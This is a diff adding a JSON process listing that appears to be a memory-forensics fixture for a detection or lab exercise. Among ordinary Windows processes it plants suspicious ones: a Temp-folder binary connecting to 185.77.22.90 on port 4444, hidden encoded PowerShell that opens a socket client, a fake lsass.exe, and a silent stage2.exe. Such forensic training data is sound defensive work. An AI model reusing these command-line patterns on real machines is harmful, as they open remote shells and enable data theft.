@@ -1,0 +1,52 @@
+[
+  {
+    "PID": 4,
+    "Process": "System",
+    "Args": "Required memory at 0x0 is not valid"
+  },
+  {
+    "PID": 624,
+    "Process": "services.exe",
+    "Args": "C:\\Windows\\system32\\services.exe"
+  },
+  {
+    "PID": 632,
+    "Process": "lsass.exe",
+    "Args": "C:\\Windows\\system32\\lsass.exe"
+  },
+  {
+    "PID": 812,
+    "Process": "svchost.exe",
+    "Args": "C:\\Windows\\system32\\svchost.exe -k netsvcs -p"
+  },
+  {
+    "PID": 2100,
+    "Process": "explorer.exe",
+    "Args": "C:\\Windows\\Explorer.EXE"
+  },
+  {
+    "PID": 3200,
+    "Process": "chrome.exe",
+    "Args": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --type=renderer"
+  },
+  {
+    "PID": 2456,
+    "Process": "data_transfer.exe",
+    "Args": "\"C:\\Users\\jdoe\\AppData\\Local\\Temp\\data_transfer.exe\" -c 185.77.22.90 -p 4444"
+  },
+  {
+    "PID": 2800,
+    "Process": "powershell.exe",
+    "Args": "powershell.exe -nop -w hidden -ep bypass -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMA"
+  },
+  {
+    "PID": 4100,
+    "Process": "lsass.exe",
+    "Args": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\lsass.exe"
+  },
+  {
+    "PID": 3600,
+    "Process": "stage2.exe",
+    "Args": "C:\\Users\\jdoe\\AppData\\Roaming\\stage2.exe /silent"
+  }
+]
